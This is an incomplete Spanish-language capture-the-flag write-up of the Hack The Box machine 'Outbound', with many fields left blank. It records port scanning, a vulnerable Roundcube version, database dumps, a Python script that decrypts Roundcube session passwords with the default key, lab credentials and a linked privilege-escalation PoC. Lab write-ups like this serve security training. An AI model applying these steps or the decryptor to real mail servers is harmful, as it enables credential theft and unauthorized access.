
---

title: "Outbound Hack The Box"
date: "2025-09-10"
description: "Debe tener Descripccion"
difficulty: "Easy"
tags: ["nmap", "gobuster", "ssh", "sudo -l"]
hero: "/img/placeholder-hero.svg"

---
# Outbound HTB

![Banner SoulMate](/img/Outbound.png)
---


- Credenciales Para El Desafio: 
    

---

## 🔎 Escaneo y Enumeración

---

### 📌 Escaneos


- Escanear y Exportar resultados:
```bash    
nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>
```

### 📦 Puertos y Servicios Descubiertos


- WhatWeb: http://outbound.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.77], RedirectLocation[http://mail.outbound.htb/], Title[302 Found], nginx[1.24.0]


- Captura:

```bash

 PORT   STATE SERVICE REASON         VERSION
 
  22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
 
  80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)

  http-title: Did not follow redirect to http://mail.outbound.htb/
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


### 🌐 Enumeración Web

- Comandos Utilisados:
    
```bash
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -b <NO-STATUS>
```


### 📂 Hallazgos

- Capturas:

![Pasted image 20251004205139.png](/img/placeholder-hero.svg)

![Pasted image 20251004205621.png](/img/placeholder-hero.svg)

- Tecnologías: ``
   
- Recurso accesibles descargables: ``
  
- Contenido Archivos: ``


### 🔍 Vulnerabilidades

-  CVE: `CVE-2025-49113`
    
-  Nivel: `___`

- Versiones Encontradas: `Roundcube 1.6.10`

### 🔗 Credenciales

-  Usuario: `___`
    
-  Contraseña: `___`
    
-  Origen (FTP/SSH/Web): `___`
    

---

# 💥 Explotación

![Pasted image 20251005195225.png](/img/placeholder-hero.svg)

![Pasted image 20251005200343.png](/img/placeholder-hero.svg)

Comandos:

```bash
mysql -u roundcube -pRCDBPass2025 -D roundcube

```

Resultado: 

```bash

# SELECT * FROM users;

user_id username         mail_host  
                 
3       tyler     localhost       {s:11:"client_hash";s:16:"2aezFDLvMZhM0VRa";i:0;b:0;}
1       jacob     localhost       {s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel       localhost       {s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}

# SHOW TABLES;

cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users

# SELECT * FROM session;


```

Decodificador:

```bash

import base64
from Crypto.Cipher import DES3

key = b'rcmail-!24ByteDESkey*Str'
def rcube_decrypt(cipher_b64, key):
    cipher_raw = base64.b64decode(cipher_b64)
    iv = cipher_raw[:8]
    ciphertext = cipher_raw[8:]
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    pad_len = plaintext[-1]
    return plaintext[:-pad_len].decode(errors="ignore")

cipher_b64 = "bL9uVf9w35H/YQC75uyDjo1d/RR/zsUU"
print(rcube_decrypt(cipher_b64, key))
```
---

### 📂 Resumen


-  Servicio: ``
    
-  Método: ``
    
-  Exploit: ``
    
-  Resultado (shell/flag): ``


### 📝 Explicación



### 🔍 Vulnerabilidades

-  CVE: `___`
    
-  Nivel: `___`
    

### 🔗 Credenciales

-  Usuario: `jacob`
    
-  Contraseña: `595mO8DmwGeD`


![Pasted image 20251007190525.png](/img/placeholder-hero.svg)

![Pasted image 20251007190702.png](/img/placeholder-hero.svg)

![Pasted image 20251007191335.png](/img/placeholder-hero.svg)

![Pasted image 20251007210947.png](/img/placeholder-hero.svg)


-  Origen (FTP/SSH/Web): `MAIL PORTAL`



POC: https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py


---

# 🛡️ Escalada

---

### 📂 Resumen


-  Impacto real: `` 
    
-  Rutas clave: `___`
    
-  Método: `Pivoting, Reastic abuse privilege`
    
-  Nivel de Acceso: `root`
    
-  PoC: `___`


### 📝 Explicación



### 🔍 Vulnerabilidades

-  CVE: `___`
    
-  Nivel: `___`
    

### 🔗 Credenciales

-  Usuario: `___`
    
-  Contraseña: `___`
    
-  Origen (FTP/SSH/Web): `___`
    

---

# 📌 Reporte Final

---

-  Descripción General: `Linux · Easy`
    
-  Recomendaciones: `___`
    
-  Puertos abiertos: `___`
    
-  Usuarios válidos: `___`
    
-  Credenciales útiles: `___`
    
-  Posibles escaladas: `___`
    
-  PoC: `___`
    
-  Impacto: `___`
    
-  Nivel de acceso logrado: `___`
    

---

# 🛠️ Notas y Herramientas:

0.10.11.77

10.10.16.89

10.158.245.23


PORT:
22
80

CREDENTIALS:
tyler = LhKL1o9Nm3X2
jacob = gY4Wr3a1evp4

SUBDOMINIOS:
mail.outbound.htb
outbound.htb


name="_token" value="U26BEkCTg2Nj1V8WN1tDW9ciR7KBPsSF"
TECNOLOGY:

Roundcube 1.6.10.


USERS:

tyler
jacob
mel
mail
root

```bash

jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
jacob@outbound:~$ whoami
jacob
jacob@outbound:~$ uname -a
Linux outbound 6.8.0-63-generic #66-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 13 20:25:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
jacob@outbound:~$ cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.2 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo


acob@outbound:~$ ss -tulpn
Netid         State          Recv-Q         Send-Q                 Local Address:Port                 Peer Address:Port        Process         
udp           UNCONN         0              0                         127.0.0.54:53                        0.0.0.0:*                           
udp           UNCONN         0              0                      127.0.0.53%lo:53                        0.0.0.0:*                           
tcp           LISTEN         0              4096                      127.0.0.54:53                        0.0.0.0:*                           
tcp           LISTEN         0              511                          0.0.0.0:80                        0.0.0.0:*                           
tcp           LISTEN         0              4096                   127.0.0.53%lo:53                        0.0.0.0:*                           
tcp           LISTEN         0              4096                       127.0.0.1:5000                      0.0.0.0:*                           
tcp           LISTEN         0              511                             [::]:80                           [::]:*                           
tcp           LISTEN         0              4096                               *:22                              *:*     

jacob@outbound:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
jacob      92270  0.0  0.1   8648  5376 pts/0    Ss+  22:03   0:00 -bash
jacob      95229  0.0  0.1   8648  5376 pts/1    Ss   22:12   0:00 -bash
jacob      96192  0.0  0.1  10884  4352 pts/1    R+   22:16   0:00 ps aux
jacob@outbound:~$ crontab -l
no crontab for jacob
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
jacob@outbound:~$ 


Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help


```